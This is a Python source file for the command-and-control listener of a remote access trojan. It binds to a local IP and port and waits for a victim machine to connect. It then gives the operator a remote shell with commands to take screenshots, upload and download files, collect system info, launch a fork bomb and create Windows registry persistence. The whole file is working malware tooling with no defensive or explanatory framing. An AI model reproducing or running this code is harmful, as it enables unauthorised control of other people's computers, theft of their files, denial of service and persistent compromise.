import socket, termcolor
import json
import os
import shutil
import sys
import subprocess

RHOST = "192.168.234.134"
RPORT = 4000

def reliable_recv():
   data = ''
   while True:
      try:
         data = data + target.recv(1024).decode().rstrip()
         return json.loads(data)
      except ValueError:
         continue

def reliable_send(data):
   jsondata = json.dumps(data)
   target.send(jsondata.encode())

def upload_file(file_name):
   f = open(file_name, 'rb')
   target.send(f.read())


def download_file(file_name):
   f = open(file_name, 'wb')
   target.settimeout(20)
   chunk = target.recv(1024)
   while chunk:
      f.write(chunk)
      try:
         chunk = target.recv(1024)
      except socket.timeout as e:
         break
   target.settimeout(None)
   f.close()


def target_reqs():
   count=0
   while True:
      cmd = input(termcolor.colored('* Shell~%s: ' % str(ip), 'red'))
      reliable_send(cmd)
      if cmd == 'exit':
         print(termcolor.colored('[-] Goodbye', 'red'))
         break
      elif cmd == 'help':
         print(termcolor.colored("""\n
         exit                                   # Exit Session With The Target
         clear                                  # Clear The Screen
         screenshot                             # Make Screeshot On The Target Machine
         frokbomb                               # Send Frokbomb To The Target Machine
         sysinfo                                # Get Target Machine Info
         cd *Dir Name*                          # Changes Directory On Target Machine
         upload *File Name*                     # Upload File To The Target Machine
         download *File name*                   # Download File From The Target Machine
         persistence *RegName* *FileName*       # Create Persistence In Registry Note Working On Windows Only
         """, 'blue'))
      elif cmd == 'clear':
         os.system('clear')
      elif cmd[:3] == 'cd ':
         l = reliable_recv()
         print(l)
         pass
      elif cmd[:6] == 'upload':
         try:
            upload_file(cmd[7:])
            print(termcolor.colored('[+] Done Uploaded file', 'green'))
            pass
         except FileNotFoundError:
            pass
      elif cmd[:8] == 'download':
         try:
            download_file(cmd[9:])
            print(termcolor.colored('[+] Done Downloaded file', 'green'))
         except FileNotFoundError:
            pass
      elif cmd[:10] == 'screenshot':
         f = open('screenshot%d.png' % (count), 'wb')
         target.settimeout(7)
         chunk = target.recv(1024)
         while chunk:
            f.write(chunk)
            try:
               chunk = target.recv(1024)
            except socket.timeout as e:
               break
         target.settimeout(None)
         f.close()
         count += 1
         print(termcolor.colored('[+] Done screenshot saved', 'green'))
      elif cmd[:11] == 'persistence':
         log = reliable_recv()
         print(log)
         pass
      elif cmd == "sysinfo":
         log = reliable_recv()
         print(log)
      elif cmd == "forkbomb":
         res = reliable_recv()
         print(res)
      else:
         result = reliable_recv()
         print(result)

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.bind((RHOST, RPORT))
print(termcolor.colored("[+] Listening for incoming requests", "green"))
skt.listen(15)
target, ip = skt.accept()
print(termcolor.colored("[+] Target connected from: " + str(ip), "green"))
target_reqs()